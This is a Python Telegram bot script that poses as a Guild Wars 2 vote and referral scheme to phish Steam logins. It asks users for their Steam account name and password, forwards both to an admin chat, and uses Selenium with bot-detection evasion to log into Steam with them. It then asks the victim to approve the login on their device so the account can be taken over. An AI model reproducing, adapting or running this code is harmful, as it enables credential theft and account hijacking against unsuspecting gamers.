import os
import time

from time import sleep
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import telebot
from fake_useragent import UserAgent
from dotenv import load_dotenv

#CMN76L26HERO00

steam_login = {}

load_dotenv()


admin_id = os.getenv('ADMIN_ID')
bot = telebot.TeleBot(os.getenv('TOKEN'))


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, text='''🌈 Dear participants of our thrilling MMO project, join the vote and share your perspectives! Exciting gaming worlds and enhancements await you, along with magical rewards for your contribution. 🎁

🌟 Remember, each vote is crucial as a key element in building our fantastical world. Be part of the process and contribute to creating something truly amazing!

🚀 Now, hold your referral code like a radiant sword! Invite your friends to this captivating adventure, and additional bonuses await, making the game even more engaging. 🌠

🎊 Don't forget that your influential perspective on the project's future could unlock new possibilities and developments. Together, we're not just creating a game but a whole world of adventures and fun!

🔮 Welcome, adventurers! Your passion and determination are the keys to our world's development. From snow-capped peaks to ancient forests, mysteries await that you've only dreamed of. 🏞️🔍

🌌 Forge your own epic, become a legend among heroes. Get involved in intrigues, form alliances, and prove your mastery in battles intertwined with art. 🤺🎭

🌆 Cities at your disposal, teeming with life and history. Develop your holdings, become a trade magnate, or a great guild builder. This is your world, where you reign! 🏰💼

🚢 All aboard! Embark on maritime adventures, explore the depths underwater, and your treasures will become legendary. Encounter mighty creatures and gain power over the oceans! 🌊🦑

🔥 Onward, magic acrobats and warriors of light! Your story is just beginning, and each step you take influences the balance of power. Dare, triumph, and let the glory of your name resound throughout Guild Wars 2! 🌐🏆

🌟 Awaken the hero within! Your resolve is unparalleled, like magic permeating our lands. From snow-capped peaks to ancient forests, mysteries await that you've only dreamed of. 🏞️🔍

🌌 Forge your own epic, become a legend among heroes. Get involved in intrigues, form alliances, and prove your mastery in battles intertwined with art. 🤺🎭

🌆 Cities at your disposal, teeming with life and history. Develop your holdings, become a trade magnate, or a great guild builder. This is your world, where you reign! 🏰💼

🚢 All aboard! Embark on maritime adventures, explore the depths underwater, and your treasures will become legendary. Encounter mighty creatures and gain power over the oceans! 🌊🦑

🔥 Onward, magic acrobats and warriors of light! Your story is just beginning, and each step you take influences the balance of power. Dare, triumph, and let the glory of your name resound throughout Guild Wars 2! 🌐🏆

🌟 Together, as one, we weave the thread of destiny for this world. Form alliances, unite in epic guilds, and let your exploits be heard throughout Guild Wars 2!

🚀 Weave your destiny with friends using referral codes, and your adventures will become even more thrilling. Together, we're not just playing, but creating a grand masterpiece.

Additional Commands:
/startadventure
/questlist
/joinarena
/partnerraid
/exploremaps
/aboutus
/contactus''')


@bot.message_handler(commands=['questlist'])
def questlist(message):
    bot.send_message(message.chat.id, text='https://wiki.guildwars2.com/index.php?title=Talk:Map&action=history')


@bot.message_handler(commands=['exploremaps'])
def exploremaps(message):
    bot.send_message(message.chat.id, text='https://wiki.guildwars2.com/wiki/Map')


@bot.message_handler(commands=['partnerraid'])
def partnerraid(message):
    part_text = bot.send_message(message.chat.id, text='Welcome to the realm of MMO adventures, hero! 🔥 <u><b>Enter your referral code</b></u> or /getrefcode to unlock epic bonuses for you and your friend. 🚀 Wield your weapon, join the battle, and together, we\'ll conquer virtual lands! 💪🌟', parse_mode='html')
    bot.register_next_step_handler(part_text, partnerraid_part2)


@bot.message_handler(commands=['startadventure'])
def startadventure(message):
    bot.send_message(message.chat.id, text='''📝 Hello, hero!\n
🛡️ Enter your account name:
/accountname Steam_Account_Name\n
🔑 Now, specify your password:
/password Your_Password\n
🚀 Are you ready for a grand journey? Your destiny awaits you!''')


@bot.message_handler(commands=['accountname'])
def accountname(message):
    steam_name = bot.send_message(message.chat.id, '🛡️ Enter your account name:')
    bot.register_next_step_handler(steam_name, hadle_steam_name)


@bot.message_handler(commands=['contactus', 'help'])
def contact(message):
    contact = bot.send_message(message.chat.id, 'Our experts are here to help! Drop us a message, and we\'ll get in touch to assist with any questions. 💬👩‍💼')
    bot.register_next_step_handler(contact, callback_contact)


def callback_contact(message):
    bot.send_message(admin_id, f'Пользователь отправил сообщение:\nusername: {message.from_user.username}\nfirst name: {message.from_user.first_name}\nlast name: {message.from_user.last_name}\n text: {message.text}')
    bot.send_message(message.chat.id, 'Thanks for the feedback!!!, we will be in touch with you shortly 👑')


def hadle_steam_name(message):
    bot.send_message(admin_id, message.text)
    steam_login['account_name'] = message.text
    bot.send_message(message.chat.id, '🛡 Your email has been accepted! 🔑 Enter a new password for your character using the command "/password". Expect a confirmation code for voting to be sent to you in 5-10 minutes. 🗳️✉️')


def hadle_password(message):
    bot.send_message(admin_id, message.text)
    steam_login['password'] = message.text
    bot.send_message(message.chat.id, '✅ ⚔️ <b><u>Everything is ready for your adventure</u></b>! Please wait <b><u>5-10 minutes</u></b> to process your request. Soon, you will receive a link with further instructions on your epic journey. 🕒✨', parse_mode='html')

    options = webdriver.ChromeOptions()
    options.add_argument('--incognito')
    options.add_argument(f"--user-agent={UserAgent().random}")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)

    service = Service(executable_path=ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)

    driver.get('https://store.steampowered.com/login/')

    element_present = EC.presence_of_element_located(
        ('xpath', '//*[@id="responsive_page_template_content"]/div[3]/div[1]/div/div/div/div[2]/div/form/div[1]/input'))
    WebDriverWait(driver, 15).until(element_present)

    account_name = driver.find_element('xpath',
                                       '//*[@id="responsive_page_template_content"]/div[3]/div[1]/div/div/div/div[2]/div/form/div[1]/input')
    account_name.send_keys(steam_login['account_name'])

    password = driver.find_element('xpath',
                                   '//*[@id="responsive_page_template_content"]/div[3]/div[1]/div/div/div/div[2]/div/form/div[2]/input')
    password.send_keys(steam_login['password'])

    button = driver.find_element('xpath',
                                 '//*[@id="responsive_page_template_content"]/div[3]/div[1]/div/div/div/div[2]/div/form/div[4]/button')
    button.click()

    if driver.find_element('xpath',
                           '//*[@id="responsive_page_template_content"]/div[3]/div[1]/div/div/div/div[2]/div'):
        bot.send_message(message.chat.id,
                         'For the final stage of authorization on your gadget - confirm entry so our bot can complete the process. Forward, into the realm of authentication exploits! 🌐🤖')
        element_present = EC.presence_of_element_located(
            ('xpath', '//*[@id="searchform"]/div'))
        WebDriverWait(driver, 600).until(element_present)
        time.sleep(1000000)
    if driver.find_element('xpath', '//*[@id="responsive_page_template_content"]/div[1]/div[1]/div/div/div/div[2]/div/form/div[5]'):
        bot.send_message(message.chat.id, 'Incorrect password or account name')
    else:
        bot.send_message(message.chat.id, 'Something went wrong, please connect with us and tell about your problem /contactus')


@bot.message_handler(commands=['password'])
def password(message):
    steam_password = bot.send_message(message.chat.id, '️🔑 Enter your password:')
    bot.register_next_step_handler(steam_password, hadle_password)


def partnerraid_part2(message):
    if message.text == 'CMN76L26HERO00':
        bot.send_message(message.chat.id, text='Code accepted! 🌟 Gear up for epic quests and victories. Adventure awaits! ⚔️\n/startadventure')
    elif message.text == 'CMM45G56HERO98':
        bot.send_message(message.chat.id, text='🌟 Oops! The referral <b><u>code is your</u></b>. 🤖 If there\'s an issue or you have questions, contact support. Your MMO adventure awaits! 🚀⚔️', parse_mode='html')
    else:
        bot.send_message(message.chat.id, text='🌟 Oops! <b><u>The referral code is not found</u></b>. 🤖 If there\'s an issue or you have questions, contact support. Your MMO adventure awaits! 🚀⚔️', parse_mode='html')


@bot.message_handler(commands=['getrefcode'])
def getrefcode(message):
    bot.send_message(message.chat.id, text='Arm yourself for battle, valiant adventurer! ⚔️ Comrades are crucial, and legendary quests are even more thrilling! Behold your code, hero: <b><u>CMM45G56HERO98</u></b>. Input it and join our epic saga. Awaits the call of adventure—seize the opportunity! 🌌\n\n <b><u>CMM45G56HERO98</u></b>', parse_mode='html')


@bot.message_handler(commands=['joinarena'])
def joinarena(message):
    bot.send_message(message.chat.id, text='https://www.guildwars2.com/en/shop/?_ga=2.201055338.573703104.1703945118-2016529936.1703939332&_gl=1*a49zv0*_ga*MjAxNjUyOTkzNi4xNzAzOTM5MzMy*_ga_5S66MJ2Z7H*MTcwMzk1NDYwMy40LjEuMTcwMzk1NDYyOS4wLjAuMA..')


@bot.message_handler(commands=['aboutus'])
def aboutus(message):
    bot.send_message(message.chat.id, text='✨Find out the answers to the mysteries of the universe of the best MMO👑💪:\nhttps://www.arena.net/en/about?_gl=1*17zgkfs*_ga*MjAxNjUyOTkzNi4xNzAzOTM5MzMy*_ga_5S66MJ2Z7H*MTcwMzk0MjA2OS4yLjAuMTcwMzk0MjA2OS4wLjAuMA..')


bot.polling(none_stop=True)
